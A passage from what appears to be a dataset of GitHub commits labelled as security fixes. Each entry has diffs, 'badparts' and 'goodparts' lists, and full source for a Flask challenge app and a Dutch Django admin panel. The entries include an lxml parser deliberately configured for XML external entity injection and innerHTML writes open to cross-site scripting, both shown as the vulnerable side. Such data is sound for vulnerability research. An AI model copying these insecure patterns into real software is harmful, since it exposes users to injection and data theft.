#333;\n+            text-align: center;\n+            margin: 0;\n+            padding: 20px;\n+            border: 2px solid #888;\n+            max-width: 800px;\n+            margin: auto;\n+        }\n+\n+        h1 {\n+            color: #004466;\n+            text-shadow: 1px 1px 2px #ccc;\n+            margin-bottom: 20px;\n+        }\n+\n+        .result-container {\n+            background-color: #e0e0e0;\n+            padding: 15px;\n+            border: 1px solid #777;\n+            box-shadow: 2px 2px 5px #999;\n+            display: inline-block;\n+            text-align: left;\n+            width: 300px;\n+            margin: auto;\n+        }\n+\n+        p {\n+            font-size: 14px;\n+            margin: 8px 0;\n+            font-family: 'Courier New', Courier, monospace;\n+        }\n+\n+        .redacted {\n+            color: #b00;\n+            font-weight: bold;\n+        }\n+\n+        a {\n+            display: block;\n+            margin-top: 20px;\n+            color: #004466;\n+            text-decoration: none;\n+            font-size: 14px;\n+        }\n+\n+        a:hover {\n+            text-decoration: underline;\n+        }\n+    </style>\n+</head>\n+<body>\n+    <h1>Lookup Result</h1>\n+    <div class=\"result-container\">\n+        {% if student %}\n+            <p><strong>Name:</strong> {{ student.name }}</p>\n+            <p><strong>Phone:</strong> {{ student.phone }}</p>\n+            <p><strong>Email:</strong> <span class=\"redacted\">{{ student.email }}</span></p>\n+            <p><strong>Address:</strong> <span class=\"redacted\">{{ student.address }}</span></p>\n+            <p><strong>Grades:</strong> <span class=\"redacted\">{{ student.grades }}</span></p>\n+        {% else %}\n+            <p>Student not found.</p>\n+        {% endif %}\n+    </div>\n+    <a href=\"/\">Back to Search</a>\n+</body>\n+</html>\n",
            "message": "",
            "files": {
                "/DMS/app.py": {
                    "changes": [
                        {
                            "diff": "\n-from lxml import etree\n-from flask import Flask, request, render_template\n-\n-app = Flask(__name__)\n-parser = etree.XMLParser(load_dtd=True, resolve_entities=True)\n-\n-@app.route(\"/\", methods=[\"GET\",\"POST\"])\n-def username():\n-    if request.method == \"POST\":\n-        xml_data = request.data\n-        print(str(xml_data))\n-        try:\n-            root = etree.fromstring(xml_data, parser=parser)\n-            name = root.findtext('name')\n-            print(f\"Extracted name: {name}\")\n-            return name\n-        except etree.XMLSyntaxError as e:\n-            print(f\"Error parsing XML: {e}\")\n-        return \"Posted!\"\n-    elif request.method == \"GET\":\n-        return render_template(\"index.html\")",
                            "add": 0,
                            "remove": 21,
                            "filename": "/DMS/app.py",
                            "badparts": [
                                "from lxml import etree",
                                "from flask import Flask, request, render_template",
                                "app = Flask(__name__)",
                                "parser = etree.XMLParser(load_dtd=True, resolve_entities=True)",
                                "@app.route(\"/\", methods=[\"GET\",\"POST\"])",
                                "def username():",
                                "    if request.method == \"POST\":",
                                "        xml_data = request.data",
                                "        print(str(xml_data))",
                                "        try:",
                                "            root = etree.fromstring(xml_data, parser=parser)",
                                "            name = root.findtext('name')",
                                "            print(f\"Extracted name: {name}\")",
                                "            return name",
                                "        except etree.XMLSyntaxError as e:",
                                "            print(f\"Error parsing XML: {e}\")",
                                "        return \"Posted!\"",
                                "    elif request.method == \"GET\":",
                                "        return render_template(\"index.html\")"
                            ],
                            "goodparts": []
                        }
                    ],
                    "source": "\nfrom lxml import etree from flask import Flask, request, render_template app=Flask(__name__) parser=etree.XMLParser(load_dtd=True, resolve_entities=True) @app.route(\"/\", methods=[\"GET\",\"POST\"]) def username(): if request.method==\"POST\": xml_data=request.data print(str(xml_data)) try: root=etree.fromstring(xml_data, parser=parser) name=root.findtext('name') print(f\"Extracted name:{name}\") return name except etree.XMLSyntaxError as e: print(f\"Error parsing XML:{e}\") return \"Posted!\" elif request.method==\"GET\": return render_template(\"index.html\") ",
                    "sourceWithComments": "from lxml import etree\nfrom flask import Flask, request, render_template\n\napp = Flask(__name__)\nparser = etree.XMLParser(load_dtd=True, resolve_entities=True)\n\n@app.route(\"/\", methods=[\"GET\",\"POST\"])\ndef username():\n    if request.method == \"POST\":\n        xml_data = request.data\n        print(str(xml_data))\n        try:\n            root = etree.fromstring(xml_data, parser=parser)\n            name = root.findtext('name')\n            print(f\"Extracted name: {name}\")\n            return name\n        except etree.XMLSyntaxError as e:\n            print(f\"Error parsing XML: {e}\")\n        return \"Posted!\"\n    elif request.method == \"GET\":\n        return render_template(\"index.html\")\n"
                }
            },
            "msg": "Updating XSS Injection challenge"
        }
    },
    "https://github.com/Anas-1077402/opdr4-cybersecurity": {
        "fff7a0900e72e50987ae01712d2a19be290d1ae8": {
            "url": "https://api.github.com/repos/Anas-1077402/opdr4-cybersecurity/commits/fff7a0900e72e50987ae01712d2a19be290d1ae8",
            "html_url": "https://github.com/Anas-1077402/opdr4-cybersecurity/commit/fff7a0900e72e50987ae01712d2a19be290d1ae8",
            "sha": "fff7a0900e72e50987ae01712d2a19be290d1ae8",
            "keyword": "XSS fix",
            "diff": "diff --git a/root/beheerder/views.py b/root/beheerder/views.py\nindex 2feb110..8497aa8 100644\n--- a/root/beheerder/views.py\n+++ b/root/beheerder/views.py\n@@ -225,7 +225,7 @@ def user_delete(request, id):\n             return redirect('user_list')\n \n     except Exception as e:\n-        return HttpResponse(f\"Fout bij het verwijderen van gebruiker: {e}\")\n+        return HttpResponse(\"Fout bij verwijderen\")\n \n \n @staff_member_required\ndiff --git a/root/static/js/main.js b/root/static/js/main.js\nindex df60936..3dd9c20 100644\n--- a/root/static/js/main.js\n+++ b/root/static/js/main.js\n@@ -67,10 +67,11 @@ function updateStatusDeelnames(Id, nieuweStatus) {\n async function getDashboardData() {\n     const response_promise = await fetch(\"/beheerder/dashboard/all\");\n     const anwser = await response_promise.json();\n-    document.getElementById('research').innerHTML = anwser['research'];\n-    document.getElementById('experience_expert').innerHTML = anwser['experience_expert'];\n-    document.getElementById('organization').innerHTML = anwser['organization'];\n-    document.getElementById('attendance_request').innerHTML = anwser['attendance_request'];\n+    // fixed code for potential XSS vulnerability\n+    document.getElementById('research').innerText = anwser['research'];\n+    document.getElementById('experience_expert').innerText = anwser['experience_expert'];\n+    document.getElementById('organization').innerText = anwser['organization'];\n+    document.getElementById('attendance_request').innerText = anwser['attendance_request'];\n     console.log(anwser)\n }\n \n",
            "message": "",
            "files": {
                "/root/beheerder/views.py": {
                    "changes": [
                        {
                            "diff": "\n             return redirect('user_list')\n \n     except Exception as e:\n-        return HttpResponse(f\"Fout bij het verwijderen van gebruiker: {e}\")\n+        return HttpResponse(\"Fout bij verwijderen\")\n \n \n @staff_member_required",
                            "add": 1,
                            "remove": 1,
                            "filename": "/root/beheerder/views.py",
                            "badparts": [
                                "        return HttpResponse(f\"Fout bij het verwijderen van gebruiker: {e}\")"
                            ],
                            "goodparts": [
                                "        return HttpResponse(\"Fout bij verwijderen\")"
                            ]
                        }
                    ],
                    "source": "\nfrom django.shortcuts import render, redirect, get_object_or_404 from django.contrib.auth import logout from.forms import RegistratieFormulier, UserEditForm from django.http import JsonResponse, HttpResponse from django.contrib.admin.views.decorators import staff_member_required from main.models import Organisaties, Onderzoeken, Deelnames, Beperkingen from ervaringsdeskundige.models import( BeperkingenOnderzoeken, User, BeperkingenErvaringsdeskundigen ) from rest_framework.decorators import api_view from django.template.loader import render_to_string from main.serializers import( OrganisatieSerializer, OnderzoekenSerializer, ExperienceExpertSerializer ) from ervaringsdeskundige.models import User as TestUser from django.db import transaction, connection from django.db.models import Q def home_view(request): return render(request, 'home.html') @staff_member_required def dashboard_beheerder(request): return render(request, 'beheerder/dashboard/dashboard.html') @staff_member_required def edit_profile(request): current_user=request.user if request.method=='POST': form=RegistratieFormulier(request.POST, instance=current_user) if form.is_valid(): form.save() return redirect('/beheerder/dashboard') else: form=RegistratieFormulier(instance=current_user) return render(request, 'beheerder/edit_profile.html',{'form': form}) def signup(request): if request.method=='POST': form=RegistratieFormulier(request.POST) if form.is_valid(): form.save() return redirect('/home/index_test.html') else: form=RegistratieFormulier() return render(request, 'beheerder/signup.html',{'form': form}) def logout_beheerder(request): logout(request) return redirect(\"/login\") @staff_member_required def change_status(request, user_id, action): pending_admin=get_object_or_404(User, id=user_id) if action=='approved': pending_admin.status=2 pending_admin.save() return redirect('/beheerder/dashboard') if action=='declined': pending_admin.status=3 pending_admin.save() return redirect('/beheerder/dashboard') @staff_member_required def onderzoeken(request): onderzoeken=Onderzoeken.objects.values( 'titel', 'omschrijving', 'datum_vanaf', 'datum_tot', 'locatie', 'status', 'opmerkingen_beheerder', 'onderzoeks_id' ) return render( request, 'beheerder/onderzoeken.html', {'onderzoeken': onderzoeken} ) @staff_member_required def users(request): return render(request, 'beheerder/users.html') @staff_member_required def update_status(request, onderzoeks_id, nieuwe_status): print(f\"Update status voor onderzoek{onderzoeks_id} naar{nieuwe_status}\") onderzoek=Onderzoeken.objects.get(onderzoeks_id=onderzoeks_id) onderzoek.status=nieuwe_status onderzoek.save() return JsonResponse({'message': 'Status bijgewerkt'}, status=200) @staff_member_required def update_organisatie_status(request, organisatie_id, nieuwe_status): organisatie=Organisaties.objects.get(organisatie_id=organisatie_id) organisatie.status=nieuwe_status organisatie.save() return JsonResponse({'message': 'Status bijgewerkt'}, status=200) @staff_member_required def update_ervaringsdeskundige_status(request, id, nieuwe_status): print(f\"Update status voor onderzoek{id} naar{nieuwe_status}\") ervaringsdeskundige=User.objects.get(id=id) ervaringsdeskundige.status=nieuwe_status ervaringsdeskundige.save() return JsonResponse({'message': 'Status bijgewerkt'}, status=200) @staff_member_required def update_deelnames_status(request, id, nieuwe_status): print(f\"Update status voor onderzoek{id} naar{nieuwe_status}\") deelnames=Deelnames.objects.get(id=id) deelnames.status=nieuwe_status deelnames.save() return JsonResponse({'message': 'Status bijgewerkt'}, status=200) @transaction.atomic def verwijder_onderzoek(request, onderzoeks_id): onderzoek=Onderzoeken.objects.get(onderzoeks_id=onderzoeks_id) if request.method=='POST': onderzoek.delete() return redirect('onderzoeken') return render( request, 'beheerder/verwijder_onderzoek.html', {'onderzoek': onderzoek} ) @staff_member_required def user_list(request): ervaringsdeskundigen=User.objects.values( 'id', 'first_name', 'last_name', 'is_superuser', 'is_staff', 'date_joined' ) all_users=list(ervaringsdeskundigen) return render(request, 'beheerder/users.html',{'all_users': all_users}) @staff_member_required def search_users(request): query=request.GET.get('query', '') ervaringsdeskundigen=TestUser.objects.filter( Q(first_name__icontains=query) | Q(last_name__icontains=query) ).all() user_list=[] for user in list(ervaringsdeskundigen): user_data={ 'id': user.id, 'first_name': user.first_name, 'last_name': user.last_name, 'is_superuser': user.is_superuser, 'is_staff': user.is_staff, 'date_joined': user.date_joined.strftime(\"%Y-%m-%d %H:%M:%S\"), } user_list.append(user_data) return JsonResponse({'users': user_list}) @staff_member_required def user_delete(request, id): sql_query=\"DELETE FROM ervaringsdeskundige_user WHERE id=%s\" beheerder_sql_query=\"DELETE FROM ervaringsdeskundige_user WHERE id=%s\" try: with transaction.atomic(): with connection.cursor() as cursor: cursor.execute(sql_query,[id]) cursor.execute(beheerder_sql_query,[id]) return redirect('user_list') except Exception as e: return HttpResponse(f\"Fout bij het verwijderen van gebruiker:{e}\") @staff_member_required def user_edit(request, id): user=get_object_or_404(User, id=id) if request.method=='POST': form=UserEditForm(request.POST, instance=user) if form.is_valid(): form.save() return redirect('user_list') else: form=UserEditForm(instance=user) return render(request, 'beheerder/user_edit.html',{'form': form}) @staff_member_required def admin_create(request): if request.method==\"POST\": reg_form=RegistratieFormulier(request.POST) if reg_form.is_valid(): reg_form.save() return redirect('user_list') else: reg_form=RegistratieFormulier() return render(request, 'beheerder/admin_create.html',{'form': reg_form}) @staff_member_required def dashboard(request): return render(request, \"beheerder/dashboard/dashboard.html\") @staff_member_required def research_item(request, pk): research_item_data=Onderzoeken.objects.select_related( \"organisatie\" ).get(pk=pk) limitation_ids=BeperkingenOnderzoeken.objects.filter( onderzoeks_id=research_item_data.onderzoeks_id ).values_list('beperking_id', flat=True) limitations=Beperkingen.objects.filter(id__in=limitation_ids) context={ \"data\": research_item_data, 'limitations': limitations, } return render( request, \"beheerder/dashboard/dashboard_research_item.html\", context ) @staff_member_required def research_item_edit(request, pk): research_item_data=Onderzoeken.objects.select_related( \"organisatie\" ).get(pk=pk) datetime_from=research_item_data.datum_vanaf datetime_till=research_item_data.datum_tot research_item_data.datum_vanaf=( str(datetime_from.date()) +'T' +str(datetime_from.time()) ) research_item_data.datum_tot=( str(datetime_till.date()) +'T' +str(datetime_till.time()) ) limitation_ids=BeperkingenOnderzoeken.objects.filter( onderzoeks_id=research_item_data.onderzoeks_id ).values_list('beperking_id', flat=True) research_limitations=Beperkingen.objects.filter(id__in=limitation_ids) all_limitations=Beperkingen.objects.all() research_limitations_id_list=[] for limitation in research_limitations: research_limitations_id_list.append(limitation.id) context={ \"data\": research_item_data, 'research_limitations_id_list': research_limitations_id_list, 'all_limitations': all_limitations, } return render( request, \"beheerder/dashboard/dashboard_research_item_edit.html\", context ) @staff_member_required def research_item_edit_save(request, pk): if request.method=='POST': instance=Onderzoeken.objects.select_related(\"organisatie\").get(pk=pk) data=request.POST print(data) serializer=OnderzoekenSerializer(instance, data) if serializer.is_valid(): old_limitations=BeperkingenOnderzoeken.objects.filter( onderzoeks_id=pk ).values_list('beperking_id', flat=True) selected_limitations=request.POST.getlist( \"selected_limitations[]\" ) selected_limitation_int=[] for selected_limitation in selected_limitations: selected_limitation_int.append(int(selected_limitation)) for limit in old_limitations: if limit not in selected_limitation_int: deletable=BeperkingenOnderzoeken.objects.filter( onderzoeks_id=pk ).filter(beperking_id=limit) deletable.delete() for selected_limitation in selected_limitation_int: if selected_limitation not in old_limitations: onderzoek_beperking=BeperkingenOnderzoeken( beperking_id=int(selected_limitation), onderzoeks_id=pk, ) onderzoek_beperking.save() serializer.save() return redirect(f\"/beheerder/dashboard/research/{pk}\") print(serializer.errors) return HttpResponse(status=400) return redirect(f\"/beheerder/dashboard/research/{pk}\") @staff_member_required def experience_expert_item(request, pk): experience_expert_item_data=User.objects.get(pk=pk) limitation_ids=BeperkingenErvaringsdeskundigen.objects.filter( ervaringsdeskundigen_id=experience_expert_item_data.id ).values_list('beperking_id', flat=True) limitations=Beperkingen.objects.filter(id__in=limitation_ids) context={ \"data\": experience_expert_item_data, 'limitations': limitations, } return render( request, \"beheerder/dashboard/dashboard_experience_expert_item.html\", context ) @staff_member_required def experience_expert_item_edit(request, pk): experience_expert_item_data=User.objects.get(pk=pk) experience_expert_item_data.geboortedatum=str( experience_expert_item_data.geboortedatum ) limitation_ids=BeperkingenErvaringsdeskundigen.objects.filter( ervaringsdeskundigen_id=experience_expert_item_data.id ).values_list('beperking_id', flat=True) experience_expert_limitations=Beperkingen.objects.filter( id__in=limitation_ids ) all_limitations=Beperkingen.objects.all() experience_expert_limitations_id_list=[] for limitation in experience_expert_limitations: experience_expert_limitations_id_list.append(limitation.id) context={ \"data\": experience_expert_item_data, 'experience_expert_limitations_id_list': experience_expert_limitations_id_list, 'all_limitations': all_limitations, } return render( request, \"beheerder/dashboard/dashboard_experience_expert_item_edit.html\", context ) @staff_member_required def experience_expert_item_edit_save(request, pk): if request.method=='POST': instance=User.objects.get(pk=pk) data=request.POST serializer=ExperienceExpertSerializer(instance, data) if serializer.is_valid(): old_limitations=BeperkingenErvaringsdeskundigen.objects.filter( ervaringsdeskundigen_id=pk ).values_list('beperking_id', flat=True) selected_limitations=request.POST.getlist( \"selected_limitations[]\" ) selected_limitation_int=[] for selected_limitation in selected_limitations: selected_limitation_int.append(int(selected_limitation)) for limit in old_limitations: if limit not in selected_limitation_int: deletable=BeperkingenErvaringsdeskundigen.objects.filter( ervaringsdeskundigen_id=pk ).filter(beperking_id=limit) deletable.delete() for selected_limitation in selected_limitation_int: if selected_limitation not in old_limitations: onderzoek_beperking=BeperkingenErvaringsdeskundigen( beperking_id=int(selected_limitation), ervaringsdeskundigen_id=pk, ) onderzoek_beperking.save() serializer.save() return redirect(f\"/beheerder/dashboard/experience_expert/{pk}\") return HttpResponse(status=400) return redirect(f\"/beheerder/dashboard/experience_expert/{pk}\") @staff_member_required def organization_item(request, pk): organization_item_data=Organisaties.objects.get(pk=pk) context={ \"data\": organization_item_data } return render( request, \"beheerder/dashboard/dashboard_organization_item.html\", context ) @staff_member_required def organization_item_edit(request, pk): organization_item_data=Organisaties.objects.get(pk=pk) context={ \"data\": organization_item_data } return render( request, \"beheerder/dashboard/dashboard_organization_item_edit.html\", context ) @staff_member_required def organization_item_edit_save(request, pk): if request.method=='POST': instance=Organisaties.objects.get(pk=pk) data=request.POST serializer=OrganisatieSerializer(instance, data) if serializer.is_valid(): serializer.save() return redirect(f\"/beheerder/dashboard/organization/{pk}\") return HttpResponse(status=400) return redirect(f\"/beheerder/dashboard/organization/{pk}\") @staff_member_required def attendance_request_item(request, pk): attendance_request_item_data=Deelnames.objects.select_related( 'onderzoeks' ).select_related('ervaringsdeskundige').get(pk=pk) experience_expert_limitation_ids=BeperkingenErvaringsdeskundigen.objects.filter( ervaringsdeskundigen_id=attendance_request_item_data.ervaringsdeskundige.pk ).values_list('beperking_id', flat=True) experience_expert_limitations=Beperkingen.objects.filter( id__in=experience_expert_limitation_ids ) research_limitation_ids=BeperkingenOnderzoeken.objects.filter( onderzoeks_id=attendance_request_item_data.onderzoeks.pk ).values_list('beperking_id', flat=True) research_limitations=Beperkingen.objects.filter( id__in=research_limitation_ids ) context={ \"data\": attendance_request_item_data, \"experience_expert_limitations\": experience_expert_limitations, \"research_limitations\": research_limitations, } return render( request, \"beheerder/dashboard/dashboard_attendance_request_item.html\", context) @staff_member_required def attendance_request_item_edit(request, pk): attendance_request_item_data=Deelnames.objects.select_related( 'onderzoeks' ).select_related('ervaringsdeskundige').get(pk=pk) experience_expert_limitation_ids=BeperkingenErvaringsdeskundigen.objects.filter( ervaringsdeskundigen_id=attendance_request_item_data.ervaringsdeskundige.pk ).values_list('beperking_id', flat=True) experience_expert_limitations=Beperkingen.objects.filter( id__in=experience_expert_limitation_ids ) research_limitation_ids=BeperkingenOnderzoeken.objects.filter( onderzoeks_id=attendance_request_item_data.onderzoeks.pk ).values_list('beperking_id', flat=True) research_limitations=Beperkingen.objects.filter( id__in=research_limitation_ids ) context={ \"research_limitations\": research_limitations, \"experience_expert_limitations\": experience_expert_limitations, \"data\": attendance_request_item_data } return render( request, \"beheerder/dashboard/dashboard_attendance_request_item_edit.html\", context ) @staff_member_required def attendance_request_item_edit_save(request, pk): if request.method=='POST': instance=Deelnames.objects.select_related( 'onderzoeks' ).select_related('ervaringsdeskundige').get(pk=pk) data=request.POST if data['status']: instance.status=data['status'] instance.contact=data['contact'] instance.save() return redirect(f\"/beheerder/dashboard/attendance_request/{pk}\") return HttpResponse(status=400) return redirect(f\"/beheerder/dashboard/attendance_request/{pk}\") @staff_member_required @api_view(['GET']) def get_dashboard(request): data=dict() list_research=Onderzoeken.objects.filter( status=1 ).select_related(\"organisatie\") count_research=list_research.count() list_experience_expert=User.objects.filter(status=1) count_experience_expert=list_experience_expert.count() list_organization=Organisaties.objects.filter(status=1) count_organization=list_organization.count() list_attendance_request=Deelnames.objects.select_related( 'onderzoeks' ).select_related('ervaringsdeskundige').filter(status=1) count_attendance_request=list_attendance_request.count() research_with_limitations={} experience_experts_with_limitations={} for research_item in list_research: limitation_ids=BeperkingenOnderzoeken.objects.filter( onderzoeks_id=research_item.onderzoeks_id ).values_list('beperking_id', flat=True) limitations=Beperkingen.objects.filter(id__in=limitation_ids) research_with_limitations[research_item.onderzoeks_id]={ 'research': research_item, 'limitations': limitations, } for experience_expert in list_experience_expert: limitation_ids=BeperkingenErvaringsdeskundigen.objects.filter( ervaringsdeskundigen_id=experience_expert.id ).values_list('beperking_id', flat=True) limitations=Beperkingen.objects.filter(id__in=limitation_ids) experience_experts_with_limitations[experience_expert.id]={ 'experience_expert': experience_expert, 'limitations': limitations, } context={ 'research': research_with_limitations, 'count_research': count_research, 'experience_expert': experience_experts_with_limitations, 'count_experience_expert': count_experience_expert, 'organization': list_organization, 'count_organization': count_organization, 'attendance_request': list_attendance_request, 'count_attendance_request': count_attendance_request, } data['research']=render_to_string( \"beheerder/dashboard/dashboard_research.html\", context, request ) data['experience_expert']=render_to_string( \"beheerder/dashboard/dashboard_experience_expert.html\", context, request ) data['organization']=render_to_string( \"beheerder/dashboard/dashboard_organization.html\", context, request ) data['attendance_request']=render_to_string( \"beheerder/dashboard/dashboard_attendance_request.html\", context, request ) return JsonResponse(data) ",
                    "sourceWithComments": "from django.shortcuts import render, redirect, get_object_or_404\nfrom django.contrib.auth import logout\nfrom .forms import RegistratieFormulier, UserEditForm\nfrom django.http import JsonResponse, HttpResponse\nfrom django.contrib.admin.views.decorators import staff_member_required\nfrom main.models import Organisaties, Onderzoeken, Deelnames, Beperkingen\nfrom ervaringsdeskundige.models import (\n    BeperkingenOnderzoeken,\n    User,\n    BeperkingenErvaringsdeskundigen\n    )\nfrom rest_framework.decorators import api_view\nfrom django.template.loader import render_to_string\nfrom main.serializers import (\n    OrganisatieSerializer,\n    OnderzoekenSerializer,\n    ExperienceExpertSerializer\n    )\nfrom ervaringsdeskundige.models import User as TestUser\nfrom django.db import transaction, connection\nfrom django.db.models import Q\n\n\ndef home_view(request):\n    return render(request, 'home.html')\n\n\n@staff_member_required\ndef dashboard_beheerder(request):\n    # pending_admins = User.objects.filter(status=1).filter(is_staff=1)\n    # current_user = request.user\n    return render(request, 'beheerder/dashboard/dashboard.html')\n\n\n@staff_member_required\ndef edit_profile(request):\n    current_user = request.user\n    if request.method == 'POST':\n        form = RegistratieFormulier(request.POST, instance=current_user)\n        if form.is_valid():\n            form.save()\n            return redirect('/beheerder/dashboard')\n    else:\n        form = RegistratieFormulier(instance=current_user)\n\n    return render(request, 'beheerder/edit_profile.html', {'form': form})\n\n\ndef signup(request):\n    if request.method == 'POST':\n        form = RegistratieFormulier(request.POST)\n        if form.is_valid():\n            form.save()\n            return redirect('/home/index_test.html')\n    else:\n        form = RegistratieFormulier()\n    return render(request, 'beheerder/signup.html', {'form': form})\n\n\ndef logout_beheerder(request):\n    logout(request)\n    return redirect(\"/login\")\n\n\n@staff_member_required\ndef change_status(request, user_id, action):\n    pending_admin = get_object_or_404(User, id=user_id)\n    if action == 'approved':\n        pending_admin.status = 2\n        pending_admin.save()\n        return redirect('/beheerder/dashboard')\n\n    if action == 'declined':\n        pending_admin.status = 3\n        pending_admin.save()\n        return redirect('/beheerder/dashboard')\n\n\n@staff_member_required\ndef onderzoeken(request):\n    onderzoeken = Onderzoeken.objects.values(\n        'titel',\n        'omschrijving',\n        'datum_vanaf',\n        'datum_tot',\n        'locatie',\n        'status',\n        'opmerkingen_beheerder',\n        'onderzoeks_id'\n        )\n\n    return render(\n        request,\n        'beheerder/onderzoeken.html',\n        {'onderzoeken': onderzoeken}\n        )\n\n\n@staff_member_required\ndef users(request):\n\n    return render(request, 'beheerder/users.html')\n\n\n@staff_member_required\ndef update_status(request, onderzoeks_id, nieuwe_status):\n    print(f\"Update status voor onderzoek {onderzoeks_id} naar {nieuwe_status}\")\n    onderzoek = Onderzoeken.objects.get(onderzoeks_id=onderzoeks_id)\n    onderzoek.status = nieuwe_status\n    onderzoek.save()\n    return JsonResponse({'message': 'Status bijgewerkt'}, status=200)\n\n\n@staff_member_required\ndef update_organisatie_status(request, organisatie_id, nieuwe_status):\n    organisatie = Organisaties.objects.get(organisatie_id=organisatie_id)\n    organisatie.status = nieuwe_status\n    organisatie.save()\n    return JsonResponse({'message': 'Status bijgewerkt'}, status=200)\n\n\n@staff_member_required\ndef update_ervaringsdeskundige_status(request, id, nieuwe_status):\n    print(f\"Update status voor onderzoek {id} naar {nieuwe_status}\")\n    ervaringsdeskundige = User.objects.get(id=id)\n    ervaringsdeskundige.status = nieuwe_status\n    ervaringsdeskundige.save()\n    return JsonResponse({'message': 'Status bijgewerkt'}, status=200)\n\n\n@staff_member_required\ndef update_deelnames_status(request, id, nieuwe_status):\n    print(f\"Update status voor onderzoek {id} naar {nieuwe_status}\")\n    deelnames = Deelnames.objects.get(id=id)\n    deelnames.status = nieuwe_status\n    deelnames.save()\n    return JsonResponse({'message': 'Status bijgewerkt'}, status=200)\n\n\n# def bewerk_onderzoek(request, onderzoeks_id):\n#    onderzoek = get_object_or_404(Onderzoeken, onderzoeks_id=onderzoeks_id)\n\n#    if request.method == 'POST':\n#       onderzoek.titel = request.POST['titel']\n#       onderzoek.omschrijving = request.POST['omschrijving']\n#       onderzoek.opmerkingen_beheerder = request.POST['opmerkingen_beheerder']\n#      onderzoek.status = request.POST['status']\n#      onderzoek.save()\n\n#       return redirect('/beheerder/onderzoeken')\n\n#   return render(\n#       request,\n#       'beheerder/bewerk_onderzoek.html',\n#       {'onderzoek': onderzoek}\n#       )\n\n@transaction.atomic\ndef verwijder_onderzoek(request, onderzoeks_id):\n    onderzoek = Onderzoeken.objects.get(onderzoeks_id=onderzoeks_id)\n\n    if request.method == 'POST':\n        onderzoek.delete()\n        return redirect('onderzoeken')\n\n    return render(\n        request,\n        'beheerder/verwijder_onderzoek.html',\n        {'onderzoek': onderzoek}\n        )\n\n\n@staff_member_required\ndef user_list(request):\n    # beheerders = Beheerders.objects.all()\n    ervaringsdeskundigen = User.objects.values(\n        'id',\n        'first_name',\n        'last_name',\n        'is_superuser',\n        'is_staff',\n        'date_joined'\n        )\n\n    all_users = list(ervaringsdeskundigen)\n\n    return render(request, 'beheerder/users.html', {'all_users': all_users})\n\n\n@staff_member_required\ndef search_users(request):\n    query = request.GET.get('query', '')\n    # beheerders = Beheerders.objects.filter(\n    #     Q(first_name__icontains=query) | Q(last_name__icontains=query)\n    #     ).all()\n    ervaringsdeskundigen = TestUser.objects.filter(\n        Q(first_name__icontains=query) | Q(last_name__icontains=query)\n        ).all()\n\n    user_list = []\n    for user in list(ervaringsdeskundigen):\n        user_data = {\n            'id': user.id,\n            'first_name': user.first_name,\n            'last_name': user.last_name,\n            'is_superuser': user.is_superuser,\n            'is_staff': user.is_staff,\n            'date_joined': user.date_joined.strftime(\"%Y-%m-%d %H:%M:%S\"),\n        }\n        user_list.append(user_data)\n    return JsonResponse({'users': user_list})\n\n\n@staff_member_required\ndef user_delete(request, id):\n    sql_query = \"DELETE FROM ervaringsdeskundige_user WHERE id = %s\"\n    beheerder_sql_query = \"DELETE FROM ervaringsdeskundige_user WHERE id = %s\"\n\n    try:\n        with transaction.atomic():\n            with connection.cursor() as cursor:\n                cursor.execute(sql_query, [id])\n                cursor.execute(beheerder_sql_query, [id])\n\n            return redirect('user_list')\n\n    except Exception as e:\n        return HttpResponse(f\"Fout bij het verwijderen van gebruiker: {e}\")\n\n\n@staff_member_required\ndef user_edit(request, id):\n    # hier checked hij eerst of het beheerder is -> zo niet dan ervaringsdeskundige formulier\n    user = get_object_or_404(User, id=id)\n\n    if request.method == 'POST':\n        form = UserEditForm(request.POST, instance=user)\n        if form.is_valid():\n            form.save()\n            return redirect('user_list')\n    else:\n        form = UserEditForm(instance=user)\n    return render(request, 'beheerder/user_edit.html', {'form': form})\n\n\n@staff_member_required\ndef admin_create(request):\n    if request.method == \"POST\":\n        reg_form = RegistratieFormulier(request.POST)\n        if reg_form.is_valid():\n            reg_form.save()\n            return redirect('user_list')\n    else:\n        # Maak een leeg formulier voor GET-verzoeken\n        reg_form = RegistratieFormulier()\n    return render(request, 'beheerder/admin_create.html', {'form': reg_form})\n\n\n@staff_member_required\ndef dashboard(request):\n    return render(request, \"beheerder/dashboard/dashboard.html\")\n\n\n@staff_member_required\ndef research_item(request, pk):\n    research_item_data = Onderzoeken.objects.select_related(\n        \"organisatie\"\n        ).get(pk=pk)\n\n    limitation_ids = BeperkingenOnderzoeken.objects.filter(\n        onderzoeks_id=research_item_data.onderzoeks_id\n        ).values_list('beperking_id', flat=True)\n    limitations = Beperkingen.objects.filter(id__in=limitation_ids)\n\n    context = {\n        \"data\": research_item_data,\n        'limitations': limitations,\n    }\n    return render(\n        request,\n        \"beheerder/dashboard/dashboard_research_item.html\",\n        context\n        )\n\n\n@staff_member_required\ndef research_item_edit(request, pk):\n    research_item_data = Onderzoeken.objects.select_related(\n        \"organisatie\"\n        ).get(pk=pk)\n\n    # Converts datetime to value compatiable with html input=datetime-local element\n    datetime_from = research_item_data.datum_vanaf\n    datetime_till = research_item_data.datum_tot\n    research_item_data.datum_vanaf = (\n        str(datetime_from.date()) + 'T' + str(datetime_from.time())\n        )\n    research_item_data.datum_tot = (\n        str(datetime_till.date()) + 'T' + str(datetime_till.time())\n        )\n\n    limitation_ids = BeperkingenOnderzoeken.objects.filter(\n        onderzoeks_id=research_item_data.onderzoeks_id\n        ).values_list('beperking_id', flat=True)\n\n    research_limitations = Beperkingen.objects.filter(id__in=limitation_ids)\n    all_limitations = Beperkingen.objects.all()\n\n    research_limitations_id_list = []\n    for limitation in research_limitations:\n        research_limitations_id_list.append(limitation.id)\n\n    context = {\n        \"data\": research_item_data,\n        'research_limitations_id_list': research_limitations_id_list,\n        'all_limitations': all_limitations,\n    }\n    return render(\n        request,\n        \"beheerder/dashboard/dashboard_research_item_edit.html\",\n        context\n        )\n\n\n@staff_member_required\ndef research_item_edit_save(request, pk):\n\n    if request.method == 'POST':\n        instance = Onderzoeken.objects.select_related(\"organisatie\").get(pk=pk)\n        data = request.POST\n        print(data)\n        serializer = OnderzoekenSerializer(instance, data)\n        if serializer.is_valid():\n            old_limitations = BeperkingenOnderzoeken.objects.filter(\n                onderzoeks_id=pk\n                ).values_list('beperking_id', flat=True)\n\n            selected_limitations = request.POST.getlist(\n                \"selected_limitations[]\"\n                )\n\n            selected_limitation_int = []\n            for selected_limitation in selected_limitations:\n                selected_limitation_int.append(int(selected_limitation))\n\n            for limit in old_limitations:\n                if limit not in selected_limitation_int:\n                    deletable = BeperkingenOnderzoeken.objects.filter(\n                        onderzoeks_id=pk\n                        ).filter(beperking_id=limit)\n\n                    deletable.delete()\n\n            for 